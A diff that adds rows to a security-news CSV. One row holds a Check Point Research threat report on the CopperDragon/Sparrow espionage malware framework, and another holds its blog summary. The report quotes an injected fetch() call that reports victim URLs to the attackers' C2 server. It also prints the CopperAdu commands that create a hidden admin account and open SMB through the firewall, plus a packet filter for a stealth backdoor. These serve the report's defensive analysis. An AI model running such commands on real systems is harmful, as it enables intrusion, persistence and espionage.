@@ -1,4 +1,640 @@
 ID,Story,Date,Category,Vendor,Source,Modules,Type,Title,Link,Context,Full Text
+89b139b60b8a,5fbbde7355b4,2026-11-10 14:01 UTC,"Attacks, Breaches & Threat Intel",Check Point,Check Point Research,Endpoint Security; Threat Intelligence,Article,Not All That Glitters Is Gold: Tracking CopperDragon’s Sparrow Framework Around the Globe,https://research.checkpoint.com/2026/not-all-that-glitters-is-gold-tracking-copperdragons-sparrow-framework-around-the-globe/,"The clusters, SilentDelivery, OceanGate and DarkWire, are linked through shared infrastructure features and malware code similarities within the Sparrow malware framework","Key Points
+
+During a year-long investigation, Check Point Research identified three distinct operational clusters spanning Latin America, Asia, and Europe targeting telecommunications providers, government organizations, military entities, research institutions, and critical infrastructure.
+
+The clusters, SilentDelivery, OceanGate and DarkWire, are linked through shared infrastructure features and malware code similarities within the Sparrow malware framework.
+
+We track the entity behind the Sparrow framework as CopperDragon, a potential digital quartermaster supporting China-nexus threat actors, including FamousSparrow, Earth Estries, TropicTrooper, UAT-9244, and others.
+
+Each cluster employed a different toolset and different initial access techniques, including compromising internet-facing infrastructure and highly selective watering-hole attacks. The compromised websites that were used for watering hole attacks were of government, shipping, and IT and research sectors.
+
+Our research uncovered several previously undocumented tools and new details about the Sparrow framework, including Windows and Linux variants, passive backdoor capabilities, and a connection to the Melofee backdoor.
+
+Introduction
+
+Over the past year, Check Point Research investigated a series of intrusion campaigns targeting several dozens of high-profile organizations across Latin America, Asia, and Europe. These campaigns initially appeared to be independent operations, each using different backdoors, post-exploitation tools and operational pace.
+
+However, we identified numerous connections between the tools and their infrastructure which linked them to the same Sparrow malware ecosystem. We track the entity behind these campaigns as CopperDragon, which may serve as a digital quartermaster supporting a number of China-nexus threat actors that use the Sparrow cross-platform malware framework for Linux and Windows.
+
+What is CopperDragon?
+
+FamousSparrow is a threat actor that was first identified in 2021, whose main backdoor is SparrowDoor. Since then, multiple vendors have reported on related activity and malware variants, including CrowDoor, HemiGate, and TernDoor.
+
+Over time, it became apparent that this other activity was not necessarily carried out by the original FamousSparrow group. Instead, reporting pointed to several distinct actors using a shared toolset, potentially supplied by the same entity. These actors include FamousSparrow, Earth Estries, TropicTrooper, UAT-9244, and others. FamousSparrow was previously also linked to Salt Typhoon, but the relationship details remain unclear. Based on the apparent tool-sharing, we began tracking the entity behind the Sparrow framework as CopperDragon, its possible developer and supplier.
+
+In this report, we examine three distinct activity clusters targeting major telecommunications providers, government organizations, and military entities. Together, these operations provide a broader view of the connected and evolving espionage ecosystem linked to CopperDragon:
+
+SilentDelivery uses highly selective watering-hole attacks that distribute the SquadC backdoor through Trojanized MSI installers masquerading as certificate repair utilities. This cluster focuses on Europe and Asia regions.
+
+OceanGate focuses primarily on Asian organizations and uses a variant of SparrowDoor. The actor first compromised internet-facing Linux systems before moving laterally into Windows environments, using a broad set of post-exploitation tools for both operating systems.
+
+DarkWire targets telecommunications providers and government organizations across Latin America, using CopperDoor and CopperDNS as its main backdoors.
+
+Figure 1 – Geographic distribution of Sparrow framework victims.
+
+SilentDelivery: Selective Watering-Hole Attacks
+
+Beginning in early 2026, we started tracking new activity related to CopperDragon that introduces a unique initial access methodology, using watering-hole attacks that target high-profile organizations mainly in Europe and Asia. We track this activity as the SilentDelivery operation. While we were finalizing this report, part of this cluster was also reported by Positive Technologies.
+
+Figure 2 – SilentDelivery infection chain.
+
+The attackers first compromised legitimate websites frequently visited by their intended targets. When a victim visited one of these websites, a heavily obfuscated JavaScript payload injected into the page completely replaced the legitimate content with a Google Chrome SSL certificate warning customized to the website’s language. The fake warning blocked access to the website and instructed the user to install a “Certificate Fix” utility. This utility deployed either a previously undocumented backdoor called SquadC or, in some cases, a variant of SparrowDoor.
+
+Figure 3 – A fake Chrome certificate error page with an added “Install certificate” button.
+
+Compromised websites
+
+All the compromised websites we confirmed were related to the government, shipping, and IT and research sectors. In one case, the website was exploited using an XSS attack on an unsensitized input field. Based on Check Point telemetry, the operations primarily targeted organizations in countries such as the Czech Republic, Germany, France, Taiwan, Nepal, Hong Kong and Indonesia.
+
+Figure 4 – A newer version of Chrome’s certificate error appearing in different languages.
+
+Across the analyzed websites, we also identified three S3 buckets that we believe were compromised by the threat actor. These buckets hosted the next-stage backdoor, which was downloaded when the user clicked the “Install certificate” button.
+
+JavaScript Analysis
+
+The JavaScript injected into the compromised websites is heavily obfuscated using jsjiami, a publicly available JavaScript obfuscation service. It first checks whether the user is running Windows and, in some cases, verifies that the website’s domain matches the intended compromised domain.
+
+Figure 5 – Deobfuscated JavaScript checking if the browser is a Windows host.
+
+The script then starts a loop that repeatedly sends status-check requests to the C2 (command and control) server at /image-check?t=<datetime>. These requests are used to fingerprint the user based on IP and geolocation and determine whether to continue the attack and hijack the webpage. They also enable the threat actor to control the attack and stop displaying the fake certificate error after a successful compromise, thus reducing the likelihood of raising the user’s suspicions. If the server returns HTTP 200, the webpage is left unchanged and the user can access the website normally. If the server does not respond, the script hijacks the webpage and displays the fake certificate error.
+
+When the user clicks “Install certificate”, the script sends a POST request to the C2 server at /report-url. This request reports the click and includes the compromised website’s URL in its JSON body. At the same time, the script initiates the download of an MSI package containing the next-stage backdoor from an attacker-controlled S3 bucket.
+
+fetch(serverUrl + ""/report-url"", { method: ""POST"", headers: { ""Content-Type"": ""application/json"" }, body: JSON.stringify({ url: window.location.href }) });
+
+After the user executes the backdoor, it sends a request to the C2 server at /register-ip, indicating a successful compromise. The fake certificate error will not appear the next time the user visits the compromised website.
+
+Stage
+
+User Action
+
+Reporting
+
+1
+
+Visits compromised site
+
+JavaScript → /image-check?t=<datetime>
+
+2
+
+Clicks “Install certificate”
+
+JavaScript → /report-url
+
+3
+
+Executes backdoor
+
+Backdoor → /register-ip
+
+SquadC backdoor
+
+SquadC is a Windows backdoor written in C/C++ that provides operators with basic remote control over a compromised host. The backdoor is loaded in memory using a separate loader component that decrypts and loads it through a three-stage process. The name SquadC is derived from an internal reference left by the author in the sample:
+
+Figure 6 – Internal reference identifying the backdoor as SquadC.
+
+Depending on its configuration, the backdoor supports several flags, including one that enables checks to avoid execution in sandbox environments. These checks look for VM artifacts in the file system and Windows registry, as well as blacklisted MAC addresses and specific screen resolutions and disk sizes.
+
+As an additional measure to evade sandboxes and automated analysis, the backdoor can be configured to run only if a browser is currently running on the host. As the backdoor is downloaded through a browser during the infection, it’s expected that a browser remains open. The check is done by enumerating running process names and comparing them against a fixed list of browsers:
+
+browser_list = [chrome.exe, msedge.exe, edge.exe, firefox.exe, brave.exe]
+
+To survive host reboots, the backdoor achieves persistence by manipulating the registry Run key under a key WindowsUpdateAssist.
+
+The backdoor supports a small set of commands for command execution and file system management and serves mainly as an initial foothold in the compromised host.
+
+These commands are supported by SquadC:
+
+Command ID
+
+Description
+
+Arguments
+
+0x2
+
+Directory listing using cmd /C dir ""<path>""
+
+directory
+
+0x3
+
+Delete file
+
+filepath
+
+0x4
+
+Write data to file path
+
+filename, data
+
+0x5
+
+Execute arbitrary command with output
+
+command
+
+0x6
+
+Run systeminfo
+
+0x7
+
+Capture full-screen screenshot
+
+0x8
+
+Status check
+
+0xA
+
+Execute arbitrary command in background
+
+command
+
+Default
+
+Returns unknown command
+
+SquadC in phishing attacks
+
+While hunting for related files, we identified an additional way to distribute SquadC through spear phishing. We found a compressed archive named Strategi_AS_Referensi_April2026.rar, uploaded to VirusTotal from Indonesia which aligns with Indonesian organizations observed in watering-hole activity. The backdoor was configured to communicate with the same IP address used in the watering-hole infection chain, suggesting that both activities were linked to the same threat actor.
+
+The archive contains four files:
+
+Strategi_AS_Referensi_April2026.docx.lnk – An LNK file abusing the ftp.exe LOLBin for command execution.
+
+_rels/info.dll – A batch script executed using ftp.exe:
+
+Figure 7 – info.dll file content.
+
+_rels/.rels.log – A cab file containing the SquadC loader components:
+
+Figure 8 – SquadC loader components in the .rels.log CAB file.
+
+_rels/557.pdf – An empty file.
+
+When the LNK file is executed, it runs a series of CMD commands to extract and execute the SquadC backdoor. It also opens a decoy document, which in this case is an empty file.
+
+SilentDelivery Infrastructure
+
+The SilentDelivery operation was attributed to CopperDragon based on two primary observations:
+
+In some cases, the final payload was a variant of SparrowDoor. Even in cases involving SquadC, the DLL used to load the backdoor was previously used in the FamousSparrow toolset.
+
+The C2 infrastructure of SquadC shares several characteristics with infrastructure associated with FamousSparrow, including server layout, exposed services and ports, HTTP response banners, and reused TLS certificates.
+
+Subject: C=US ST=US L=Oregon O=VeriSign Class 3 Code Signing 2010 CA OU=VeriSign Class 3 Code Signing 2010 CA CN=VeriSign Trust Network Issuer: C=US ST=US L=Santa Clara O=McAfee, Inc. OU=McAfee, Inc. CN=McAfee, Inc. Serial Number: 0x4872589ca964eac0776b1e9617e9813cb1da49dc Not Before: 2023-04-28 11:13:39 Not After: 2024-04-27 11:13:39 Fingerprint SHA-1: 760be920fad07881b8ce9d94e074a35b4f806717
+
+TLS certificate reused across SilentDelivery and OceanGate C2 infrastructure.
+
+OceanGate: From Linux Initial Access to Domain Administrator
+
+The OceanGate operation was observed during 2025-2026 primarily targeting government organizations and critical infrastructure in Asia. Some activity was also seen in other regions. The operation followed a more common intrusion pattern, with tooling and operational TTPs (Tactics, Techniques, and Procedures) consistent with those previously reported by multiple vendors and tracked as FamousSparrow.
+
+In this attack, the threat actor operated across both Linux and Windows environments, deploying several previously unreported tools to maintain access and move across the compromised network. The operation involved extensive credential theft, lateral movement, data staging, and exfiltration of sensitive operational information. The Linux activity was particularly interesting, given the limited reporting on how the actor operates in these environments and the tools it uses.
+
+Linux operation
+
+The intrusion began with the exploitation of a vulnerable internet-facing Linux server, followed by the deployment of two new backdoors: AnnobinDoor and SparrowShell.
+
+Figure 9 – OceanGate cluster: Linux attack chain diagram.
+
+AnnobinDoor
+
+The first backdoor deployed after initial access was AnnobinDoor, a statically linked, Go-based backdoor packed with UPX and internally named annobinagent. By default, it uses WebSocket but also supports HTTP and raw TCP. Its requests include browser-like headers and standard WebSocket upgrade fields, which helps the traffic resemble legitimate application communications.
+
+The backdoor provides a broad range of remote access and pivoting capabilities, including an interactive shell, file management, SOCKS proxying, SSH tunneling, port forwarding, and reverse connections.
+
+Together, these features allow the infected Linux host to function as both a remote shell and an internal network pivot.
+
+SparrowShell
+
+Later in the attack, the actor also deployed another backdoor we named SparrowShell. SparrowShell is a modular Linux backdoor that shares significant design and code similarities with the Windows backdoor SparrowDoor. The two belong to the same cross-platform malware family, with versions developed for Linux and Windows. They share the same C2 infrastructure and RC4 decryption keys, as well as similar command-line arguments and comparable plugin-based architectures.
+
+These commands are supported by SparrowShell:
+
+Command ID
+
+Direction
+
+Description
+
+0x1001
+
+Client → C2
+
+Sends host fingerprint (OS, IPs, user, hostname, timestamp, host ID). Waits for magic value 0x11223344 to confirm the connection and mark the C2 as active.
+
+0x1002
+
+Client ︎ C2
+
+Requests a plugin module from the C2. Receives encrypted blob, decrypts it, saves to /tmp/%x, loads via dlopen, executes xmain, then deletes it from disk.
+
+0x1003
+
+Client → C2
+
+Sends additional host identifier/hash. Connection is validated based on the C2 response (0x11223344) or dropped if invalid.
+
+0x1004
+
+C2 → Client
+
+Returns current runtime configuration (228-byte structure) to the C2.
+
+0x1005
+
+C2 → Client
+
+Receives new configuration (228 bytes), encrypts it, and stores it as <executable>_ for persistence across runs.
+
+0x1006
+
+C2 → Client
+
+Removes persistence (cron/systemd), deletes binary and config, clears temp files, removes iptables rules, and terminates execution.
+
+0x1007
+
+C2 → Client
+
+Opens a local TCP listener on a specified port and bridges incoming connections to the C2 (port forwarding).
+
+0x100A
+
+C2 → Client
+
+Sends a serialized list of currently loaded plugin families and their metadata.
+
+0x100B
+
+C2 → Client
+
+No detected action; likely reserved for future use.
+
+0x100C
+
+C2 → Client
+
+Removes a loaded plugin based on its family ID.
+
+0x100D
+
+C2 → Client
+
+Establishes outbound connection to target/port and bridges it to the C2, enabling reverse tunneling.
+
+0x100E
+
+C2 → Client
+
+Disconnects from the C2 and sleeps for a specified number of minutes before reconnecting.
+
+Trojanized SSH tools
+
+A few days later, the threat actor replaced the legitimate SSH client and SSHD components on the server with Trojanized versions designed to log credentials during administrative activity. This allowed the actor to harvest credentials from multiple users and move to other Linux hosts on the network, where the same technique was used again.
+
+Public tools
+
+Besides custom tools and scripts, the threat actor also used popular publicly available tools, including FRPC and Chisel, which provided additional channels for remote access and internal pivoting. The actor also used ASimplePortScanner, an open-source Python scanner, to discover additional hosts in the network.
+
+Windows Operation
+
+Figure 10 – OceanGate: Lateral movement to Windows environment and tool deployment.
+
+After harvesting credentials from multiple users and establishing a strong foothold in the Linux environment, the actor moved into the Windows environment.
+
+The actor attempted to log in to several Windows machines over RDP, trying different passwords until it successfully authenticated with an administrator account. It then deployed a set of custom post exploitation tools before deploying the final windows backdoor a variant of SparrowDoor.
+
+CopperAdu
+
+CopperAdu is a post-exploitation tool that configures a compromised Windows host for remote administrative access, preparing it for further attacker activity.
+
+It creates a local account with hardcoded credentials, disables password expiration, and adds the account to the local Administrators group. It also modifies the registry to hide the account from the standard Windows logon interface.
+
+The tool sets LocalAccountTokenFilterPolicy to 1, allowing remote connections using local administrator accounts to retain full administrative privileges and facilitating lateral movement.
+
+Finally, CopperAdu enables the LanmanServer and LanmanWorkstation services and configures an inbound Windows Firewall rule to allow SMB traffic on TCP port 445.
+
+net user admin$ ""Admin@123456"" /add /expires:never /passwordchg:no wmic useraccount where ""Name='admin$'"" set PasswordExpires=false net localgroup administrators admin$ /add sc config LanmanServer start= auto sc start LanmanServer sc config LanmanWorkstation start= auto sc start LanmanWorkstation netsh advfirewall firewall delete rule name = ""RasiUwpApp"" netsh advfirewall firewall add rule name=""RasiUwpApp"" dir=in action=allow protocol=TCP localport=445 profile=any
+
+CopperList
+
+The actor then deployed CopperList, a Windows reconnaissance tool that collects host information, disk details, and a recursive file inventory, including file paths, sizes, and timestamps. It scans fixed drives while excluding common system and application directories, focusing on user data and potentially sensitive files. The collected information is compressed using LZNT1 and staged for exfiltration by other attacker-deployed components.
+
+Figure 11 – CopperList output on a test machine.
+
+CopperLogger
+
+On some hosts, the actor deployed CopperLogger, a Raw Input-based keylogger. It registers a hidden window (kbl) and subscribes to keyboard input events, allowing it to capture keystrokes regardless of which application is in focus.
+
+Beyond keystroke logging, the malware also collects contextual information, including:
+
+Active window titles
+
+Associated process names and paths
+
+User session context
+
+In addition, the malware monitors clipboard activity involving copying and pasting, and stores it alongside the keystroke data.
+
+CopperLsa
+
+For credential theft on Windows systems, the actor deployed CopperLsa, a tool that collects credentials directly through the Windows authentication flow. Its loader decrypts two embedded DLLs: one installs a custom LSA security package inside LSASS, while the other collects passwords, hashes, and authentication tokens from several authentication mechanisms, including NTLM and Kerberos. The stolen credentials are saved to a log file at a location chosen by the operator.
+
+Kernel-level capabilities
+
+In some cases, we observed the actor adding kernel rootkits and kernel-level access capabilities to its main backdoors: SparrowDoor for Windows and SparrowShell for Linux.
+
+SparrowShell kernel rootkit
+
+SparrowShell supports integration with an embedded kernel rootkit. When executed with the hide flag, the backdoor locates an appended encrypted blob, decrypts it, and loads it into memory as a kernel module using the init_module system call.
+
+The kernel component is a modified version of the open-source Reptile rootkit and supports capabilities such as hiding files, processes, and network activity. Communication between user space and the rootkit uses a custom ioctl interface with the ID 0x0e0e0e0e.
+
+Figure 12 – Reptile rootkit that SparrowShell is based on.
+
+Passive Sparrow backdoor
+
+Some observed versions of the Windows backdoor SparrowDoor include kernel-level packet interception capabilities, with WinDivert drivers embedded as resources for x86 and x64. WinDivert is a legitimate driver for network packet capture and manipulation, and is commonly used by utilities such as VPNs, firewalls, and tunneling applications.
+
+Figure 13 – Passive Sparrow communication scheme.
+
+The actor abused the driver to convert SparrowDoor into a passive backdoor that intercepts and manipulates packets at the kernel level, making its traffic less visible. This allows the backdoor to listen internally on one port while receiving connections through an externally accessible port, such as 443, that is already used by a legitimate service.
+
+The backdoor applies a strict filter to intercept connections from a specific source IP address to the legitimate service’s port. It manipulates the packet and rewrites the destination port to the backdoor’s internal listening port, typically a high port such as 49628. For response traffic, it rewrites the source port back to the external service port, making the responses appear to originate from the legitimate service.
+
+( (inbound and tcp.DstPort == %d // Legitimate external listening port and ip.SrcAddr == %s) or // Connections from a specific source IP (outbound and tcp.SrcPort == %d) // Backdoor's internal listening port )
+
+Incoming connections are checked for the magic value 0x11223344. Matching requests are queued for backdoor command processing, while nonmatching traffic is forwarded to the legitimate service at 127.0.0.1:<external_port>, allowing normal connections to continue functioning.
+
+Melofee
+
+While analyzing SparrowShell, we identified several similarities with the Melofee backdoor, which was first discovered in 2023. Both use similarly modified versions of the open-source Reptile rootkit and share code similarities in how they decrypt, load, and activate the rootkit. They also support the same hide and show command-line arguments for rootkit control. These similarities led some vendors to classify SparrowShell as Melofee.
+
+The connection between Melofee and CopperDragon’s SparrowShell became stronger when we analyzed Melofee samples that also shared infrastructure characteristics, particularly in their self-signed certificates. Both used certificate subject values such as Some-State and O=Internet Widgits Pty Ltd and impersonated public DNS servers in the common name (CN) field. Both also used certificates created years earlier that remained in use long after their expiration.
+
+Figure 14 – TernDoor certificate from Talos blog 2026.
+
+Figure 15 – Melofee certificate on Virus Total from 2026.
+
+Based on these findings, including code similarities and infrastructure overlaps, we assess that CopperDragon is also involved in maintaining and supplying Melofee variants.
+
+DarkWire: Compromising Telecommunications Providers
+
+Figure 16 – DarkWire toolset.
+
+In mid-2025, we identified a new wave of activity, tracked as DarkWire. While initially concentrated in Latin America, more recent intrusions suggest expansion beyond the region. Victimology indicates a clear focus on telecommunications operators and government entities, including at least three major telecom providers in the region, as well as the foreign affairs and justice sectors.
+
+Throughout our investigation, we uncovered multiple custom tools, suggesting the actor maintains a broader proprietary toolkit. The actor deployed two newly identified backdoors, which we named CopperDoor and CopperDNS. These appear to function as the group’s primary implants and may have replaced the SparrowDoor family.
+
+Beyond these backdoors, the actor was observed deploying several additional custom tools, including proxy utilities such as CopperProxy and PyProxy, as well as CopperLsass, a dedicated module used to dump the LSASS process for credential harvesting. Most of the post exploitation tools including the new backdoors were loaded by a unique loader we named CopperLoader.
+
+Alongside these tools, the operators also employed publicly available software, such as SoftEther VPN renamed to names like vmtoolsd.exe and csrss.exe. For lateral movement, they transferred files over SMB and executed remote commands via WMI, using wmiexec.
+
+CopperLoader
+
+CopperLoader is a reflective loader typically deployed through DLL sideloading. It consists of position-independent shellcode written into a modified version of the original DLL being hijacked. In some cases, CopperLoader was not the initial sideloaded component, but arrived as a second-stage shellcode payload delivered by another shellcode loader.
+
+CopperLoader loads an encrypted next-stage PE module from a .dat file in its directory. These files contain the next-stage module in encrypted form. While the exact layout varies across samples, a consistent set of embedded headers provides the information needed to process each payload: module length, RC4 decryption key, and in some cases, the backdoor configuration.
+
+The MZ and PE signatures were removed in the decrypted module, hindering memory scanning and automated extraction.
+
+We observed CopperLoader delivering four unique tools: CopperDoor, CopperDNS, CopperProxy, and CopperLsass.
+
+CopperDoor & CopperDNS
+
+The main backdoor used in the DarkWire operation was CopperDoor, a newly identified advanced modular backdoor that resides entirely in memory. CopperDoor uses some novel techniques such as call stack spoofing and gadget-based execution for EDR evasions. The malware, also known as SparroWocky, was recently analyzed in depth by ESET as part of its research into FamousSparrow activity.
+
+Alongside CopperDoor, we also observed a variant of the backdoor that communicates through DNS tunneling using MX queries, which we named CopperDNS.
+
+Figure 17 – DNS Tunneling send flow in CopperDNS.
+
+CopperProxy & PyProxy
+
+CopperProxy is a SOCKS5 proxy tool. It accepts an IP address and TCP port as command-line arguments, configures a Windows Firewall rule named ss1 for the specified port, and listens for incoming connections, supporting up to 300 concurrent clients. For each connection, it handles SOCKS5 negotiation, connects to the requested destination, and relays traffic in both directions.
+
+PyProxy is a lightweight UDP relay written in Python and packaged as a standalone executable using PyInstaller. It listens on a fixed local UDP port and relays traffic in both directions between local clients and a hardcoded remote IP address and port.
+
+Figure 18 – Decompiled PyProxy python code.
+
+CopperLsass
+
+CopperLsass is a DLL module that loads a component named slave.dll into LSASS by registering it as a security package through RPC. Once inside LSASS, slave.dll uses the Windows library comsvcs.dll and a helper DLL, dep.dll to create a full LSASS memory dump, encrypt it using a custom SUB-XOR-ADD algorithm, and delete the original dump. In observed intrusions, the encrypted file was renamed to 1.png before exfiltration to resemble an image file.
+
+Execution and Staging
+
+The operation heavily relies on DLL sideloading as a primary execution technique, often abusing executables that are not widely observed among other threat actors in the wild.
+
+The executables we observed in use include:
+
+DLL Name
+
+Original EXE Name
+
+ncpmif32.dll
+
+ncptrcw.exe
+
+winfsp.dll
+
+fsptool.exe
+
+libvlccore.dll
+
+vlc.exe
+
+DukeQt.dll
+
+gethwid.exe
+
+zCrashReport64.dll
+
+zCrashReport64.exe
+
+To minimize their footprint, the operators deliberately avoided creating new directories on disk, instead placing their tools within existing system paths.
+
+The file paths we observed in use:
+
+Path
+
+C:\Program Files\7-Zip\Lang
+
+C:\Windows\debug
+
+C:\Windows\System32
+
+C:\ProgramData\vmware\logs
+
+C:\ProgramData\Oracle\Java
+
+C:\ProgramData\USOShared
+
+C:\ProgramData\Waves
+
+DarkWire Infrastructure
+
+CopperDoor infrastructure demonstrated a higher level of operational security. The associated IP addresses were distributed across a variety of autonomous systems. These servers typically exposed port 443, with communications conducted over raw TCP encapsulated in TLS instead of standard HTTPS. In several cases, the TLS certificates deployed on these C2 servers contained Common Name (CN) values that closely mimic domains associated with the targeted victim organizations.
+
+ASN
+
+AS-VULTR, US (AS20473)
+
+KAOPU-HK Kaopu Cloud HK Limited, HK (AS138915)
+
+LATITUDE-SH (AS396356)
+
+XNNET, US (AS6134)
+
+CDNEXT, GB (AS212238)
+
+ONEPROVIDER-AS BrainStorm Network, Inc, CA (AS136258)
+
+In contrast, infrastructure linked to CopperDNS, which functions as a DNS tunneling C2 channel, consisted primarily of Windows-based hosts. These systems were consistently hosted within AS20473, AS-VULTR, exposed high-numbered ports (most commonly 6532), and reused a distinctive TLS certificate (SHA-256: ee4a8b81fe3864582efc27a77f806990e2602dcc36447ddda4b3a230a473d575) across multiple nodes.
+
+Subject: CN=8.8.8.8 Issuer: CN=8.8.8.8 Serial Number: 0x20a61422b0352cfc9ef688dc800bcdf810f1fe7d Not Before: 2025-07-16T03:10:29 Not After: 2026-07-16T03:10:29 Fingerprint SHA-1: de32c58a8087cc4f24b9eb65c8ff4516f0f65f13
+
+An additional pattern we observed across both infrastructures is geographic alignment with target regions. Most IP addresses were located in Latin America, often within the same country as the victim organization. This proximity likely helps the malicious traffic blend in with legitimate network activity and reduces the chances of detection.
+
+DarkWire Attribution
+
+We did not identify direct code similarities in DarkWire cluster with other tools in the CopperDragon toolset aside from general design patterns. However, we found an infrastructure link to a previous report on FamousSparrow activity. The domain amelicen[.]com was reported as a SparrowDoor C2 server, and our telemetry showed that the same domain was also part of the CopperDNS infrastructure.
+
+We also observed VirusTotal submitters uploading files related to both SparrowDoor and DarkWire around the same time, suggesting that these tools may have been used in the same attack. In a recent report, ESET also observed that SparrowDoor was replaced on compromised hosts by CopperDoor (AKA SparroWocky), further strengthening the connection we identified.
+
+Summary
+
+CopperDragon is an entity we track as a possible digital quartermaster supporting several China-nexus threat actors that use the cross-platform Sparrow framework.
+
+We identified at least three activity clusters, each using its own main backdoor and targeting different regions and organizations:
+
+SilentDelivery – Uses the newly discovered SquadC along with a variant of SparrowDoor in watering-hole attacks across Europe and Asia.
+
+OceanGate – Operates primarily in Asia, uses a variant of SparrowDoor and SparrowShell, and shows possible links to Melofee.
+
+DarkWire – Targets telecommunications operators and government organizations in Latin America and uses the new CopperDoor and CopperDNS backdoors.
+
+These findings provide a foundation for understanding CopperDragon’s potential users and more precise tracking of activity previously grouped under the FamousSparrow umbrella. In the highly interconnected China-nexus threat ecosystem, shared malware and infrastructure can blur the boundaries between operators and campaigns. However, the use of the same backdoor or C2 infrastructure does not necessarily mean that two intrusions were conducted by the same actor.
+
+Technical Appendix
+
+Full list of tools:
+
+Tool
+
+Platform
+
+Purpose
+
+CopperLoader
+
+Windows
+
+DLL loader that de [truncated for CSV - full text is in the JSON export]"
+5fbbde7355b4,5fbbde7355b4,2026-11-10 13:00 UTC,"Attacks, Breaches & Threat Intel",Check Point,Check Point Blog,Endpoint Security; Threat Intelligence,Article,CopperDragon: Uncovering a Global China-Nexus Cyber Espionage Framework,https://blog.checkpoint.com/security/copperdragon-uncovering-a-global-china-nexus-cyber-espionage-framework/,"In addition to identifying malware and post-exploitation activity on endpoints, its browser security capabilities help protect users against web-based threats, malicious sites...","A year-long Check Point Research investigation has connected three China-nexus cyber-espionage clusters targeting government, telecommunications and critical infrastructure organizations across Europe, Asia and Latin America. While parts of this activity have previously been reported separately, the wider investigation reveals new insights and connections through shared malware and infrastructure, pointing to a broader ecosystem linked to an entity Check Point Research tracks as “CopperDragon”.
+
+CopperDragon may operate as a digital quartermaster, developing or supplying malware and infrastructure to multiple sophisticated China-nexus threat actors. By examining the connections between these campaigns, Check Point Research provides a broader view of an espionage ecosystem spanning Windows and Linux environments, multiple regions and some of the world’s most strategically important sectors.
+
+Figure 1 – Geographic distribution of Sparrow framework victims.
+
+Key Findings
+
+Check Point Research connected three operational clusters across Latin America, Asia and Europe, targeting government, telecom, military, research and critical infrastructure organizations.
+
+CopperDragon may act as a digital quartermaster, supplying malware and infrastructure to multiple China-nexus threat actors using the Sparrow framework.
+
+Activity was observed across 21 countries, with the research expanding known victimology and uncovering previously undocumented activity in Asia, including significant focus on India.
+
+Researchers uncovered previously undocumented Windows and Linux malware, including SquadC, AnnobinDoor and SparrowShell, alongside new details about the Sparrow framework.
+
+Attackers used different entry methods, from compromised internet-facing servers to selective watering-hole attacks involving fake browser certificate warnings.
+
+What Is CopperDragon?
+
+CopperDragon is the name Check Point Research uses to track the entity behind the Sparrow malware framework, which may serve as a developer and supplier supporting multiple China-nexus threat actors. The research suggests that malware and infrastructure associated with CopperDragon are being used across operations conducted by different China-nexus groups, rather than representing the activity of a single threat actor.
+
+The picture began with FamousSparrow, previously linked to Salt Typhoon, a threat actor first identified in 2021 and associated with the SparrowDoor backdoor. In subsequent years, related malware and infrastructure appeared in activity associated with other China-nexus actors, including Earth Estries, TropicTrooper and UAT-9244. By examining these connections, Check Point Research identified signs of a common malware ecosystem that could be supporting multiple operators.
+
+This distinction also matters for attribution. The presence of the same malware or command-and-control infrastructure across two intrusions does not necessarily mean they were conducted by the same threat actor. CopperDragon may instead represent a common supplier, helping explain why related tools and infrastructure appear across otherwise distinct espionage campaigns.
+
+What Did Check Point Research Discover About CopperDragon?
+
+The investigation connects activity that had previously been associated with separate campaigns and threat actors, providing a broader picture of how the Sparrow malware ecosystem is being used around the world. Check Point Research divided this activity into three operational clusters, SilentDelivery, OceanGate and DarkWire, based on differences in targeting, geography, malware and attack techniques.
+
+The research also expands the known scope of the activity. Check Point Research identified a broader range of affected countries and sectors, uncovered previously undocumented activity in Asia with a particular focus on India, and discovered previously undocumented malware for both Windows and Linux. New findings include SquadC, AnnobinDoor and SparrowShell, alongside additional details about Sparrow’s passive backdoor and kernel-level capabilities.
+
+Together, these findings support a broader view of CopperDragon as a possible digital quartermaster providing malware or infrastructure that different China-nexus operators can incorporate into their own campaigns. This provides another way to understand activity that could otherwise appear unrelated when examined as individual attacks.
+
+Where Is CopperDragon Targeting Organizations?
+
+Check Point Research observed CopperDragon-linked activity across 21 countries in Latin America, Europe and Asia, targeting telecommunications providers, government organizations, military entities, research institutions and critical infrastructure. The investigation separated the activity into three clusters based on their geography, tools and attack methods.
+
+SilentDelivery focuses primarily on Europe and Asia and uses highly selective watering-hole attacks, including in Germany, France and Czech Republic. Attackers compromise legitimate websites associated with sectors such as government, shipping, IT and research, then selectively present visitors with fraudulent Chrome certificate warnings. Victims who follow the instructions can be tricked into downloading a supposed certificate repair utility that instead installs the SquadC backdoor or, in some cases, a variant of SparrowDoor.
+
+Figure 2 – SilentDelivery infection chain.
+
+OceanGate operates primarily in Asia and includes previously undocumented activity with a particular focus on India. In observed intrusions, attackers compromised internet-facing Linux systems and deployed custom backdoors before harvesting credentials and moving into Windows environments. The campaign provides additional insight into an area that has received comparatively limited attention: how Sparrow-related actors operate across Linux and Windows systems within the same intrusion.
+
+Figure 3 – OceanGate cluster: Linux attack chain diagram.
+
+DarkWire has been concentrated primarily in Latin America, although more recent intrusions indicate activity beyond the region. It targets telecommunications providers and government organizations using newly identified malware including CopperDoor and CopperDNS, together with tools designed for credential harvesting, internal reconnaissance and network movement.
+
+Figure 4 – DarkWire toolset.
+
+Why Are Government and Telecommunications Organizations Being Targeted?
+
+Government and telecommunications organizations can provide significant intelligence value to espionage operations. A compromise of a government network can expose sensitive information, credentials and communications, while sustained access can create opportunities for continued intelligence collection.
+
+Telecommunications providers are uniquely valuable targets for cyber espionage. Compromise one, and attackers can see far beyond the provider itself. Depending on which systems they reach, they can collect call detail records (CDRs) that reveal who talks to whom, when, and for how long. They can track subscriber locations and read SMS messages. In some environments, access may extend to lawful intercept systems, exposing which people government and law-enforcement agencies are monitoring.
+
+This makes the concentration of DarkWire activity in Latin America particularly significant. The targeting takes place against a backdrop of growing strategic and economic competition involving China, the United States and countries across the region. While the technical evidence does not establish geopolitical motivation for individual attacks, the intelligence value of telecommunications and government infrastructure makes these sectors important targets for sophisticated espionage operations.
+
+How Does CopperDragon Compromise Organizations?
+
+The three clusters show that CopperDragon-linked actors use multiple routes into targeted organizations rather than relying on one attack method. Their techniques range from the exploitation of vulnerable public-facing infrastructure to compromised websites and selective social engineering.
+
+SilentDelivery provides one of the clearest examples. Attackers compromise legitimate websites and inject heavily obfuscated JavaScript that communicates with attacker-controlled infrastructure. Selected visitors can then be presented with a fake Chrome certificate error instructing them to install a certificate fix. The download instead delivers SquadC or, in some cases, SparrowDoor, allowing attackers to establish an initial foothold.
+
